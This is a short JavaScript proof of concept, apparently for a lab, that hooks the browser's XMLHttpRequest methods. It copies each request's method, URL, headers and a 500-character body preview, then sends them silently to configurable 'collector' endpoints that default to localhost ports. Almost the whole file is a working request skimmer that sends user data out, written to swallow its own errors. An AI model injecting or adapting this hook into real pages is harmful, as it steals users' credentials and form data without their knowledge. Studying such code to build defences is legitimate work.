(() => {
  const cfg = window.__POC_E__ || {};
  const collectorsCfg = (cfg && cfg.collectors) || {};

  const COLLECTORS = [
    collectorsCfg.c1 || "http://localhost:5001/mirror",
    collectorsCfg.c2 || "http://localhost:5002/mirror",
    collectorsCfg.c3 || "http://localhost:5003/mirror",
  ].filter(Boolean);

  function getSid() {
    try {
      const el = document.getElementById("sidLabel");
      if (el && el.textContent) return el.textContent.trim();
    } catch (_) {}
    return "";
  }

  function safeJsonParse(s) {
    try { return JSON.parse(s); } catch (_) { return null; }
  }

  function mirrorSend(payload) {
    const sid = getSid();
    const body = JSON.stringify(payload);

    for (const u of COLLECTORS) {
      try {
        fetch(u, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-BRS-Mirror": "1",
            "X-POC-Session": sid,
          },
          body,
          keepalive: true,
        }).catch(() => {});
      } catch (_) {}
    }
  }

  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;
  const origSetHeader = XMLHttpRequest.prototype.setRequestHeader;

  XMLHttpRequest.prototype.open = function (method, url) {
    this.__poc_method = String(method || "GET").toUpperCase();
    this.__poc_url = String(url || "");
    return origOpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.setRequestHeader = function (k, v) {
    try {
      if (!this.__poc_headers) this.__poc_headers = {};
      this.__poc_headers[String(k).toLowerCase()] = String(v);
    } catch (_) {}
    return origSetHeader.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function (body) {
    try {
      const ct = (this.__poc_headers && this.__poc_headers["content-type"]) || "";

      let bodyKind = "none";
      let bodySize = 0;
      let bodyPreview = null;

      if (typeof body === "string") {
        bodyKind = "string";
        bodySize = body.length;
        bodyPreview = body.slice(0, 500);
      } else if (body instanceof FormData) {
        bodyKind = "formdata";
        bodySize = 0;
        bodyPreview = "[FormData]";
      } else if (body && typeof body === "object") {
        bodyKind = "object";
        const s = JSON.stringify(body);
        bodySize = s.length;
        bodyPreview = s.slice(0, 500);
      }

      mirrorSend({
        ts: Date.now(),
        page: location.href,
        method: this.__poc_method,
        url: this.__poc_url,
        contentType: ct,
        bodyKind,
        bodySize,
        bodyPreview,
      });
    } catch (_) {}

    return origSend.apply(this, arguments);
  };

  console.log("[PoC-E hook] XHR prototype hooked. collectors=", COLLECTORS);
})();